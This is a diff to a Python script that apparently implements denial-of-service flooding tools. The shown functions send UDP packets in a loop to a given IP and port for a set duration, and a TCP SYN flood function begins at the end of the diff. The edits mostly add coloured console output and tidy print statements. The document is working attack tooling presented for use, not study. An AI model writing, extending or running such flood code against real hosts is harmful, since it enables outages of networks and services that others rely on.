@@ -30,17 +30,16 @@ def udp_plain_flood(ip, port, duration, packet_size):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
     packet_count = 0
-    payload = b"A" * packet_size  # Fixed payloaf
-        
+    payload = b"A" * packet_size  # Fixed payloaf    
     print(f"[*] Starting UDP Plain flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
     try:
         while time.time() < end_time:
             time.sleep(0.2)
-            print(f"[*]\033[94m Starting UDP Plain flood on {ip}:\033[33m{port}\033[32m with {packet_count}\033[37m byte packets for {duration_secods} seconds...")
+            print(f"[*]\033[94m Starting UDP Plain flood on\033[36m {ip}:\033[33m{port}\033[32m with {packet_count}.")
             sock.sendto(payload, (ip, port))
             packet_count += 1
     except Exception as e:
-        print(f"[!] Error during UDP Plain flood: {e}")
+        print(f"[!]\033[91m Error during UDP Plain flood: {e}")
     finally:
         sock.close()
         print(f"[+] UDP Plain flood complete! Sent {packet_count} packets.")
@@ -63,7 +62,6 @@ def udp_random_flood(ip, port, duration, packet_size):
     finally:
         sock.close()
         print(f"[+] UDP Random flood complete! Sent {packet_count} packets.")
-
 # TCP Flood Methods
 def tcp_syn_flood_single(ip, port, duration):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
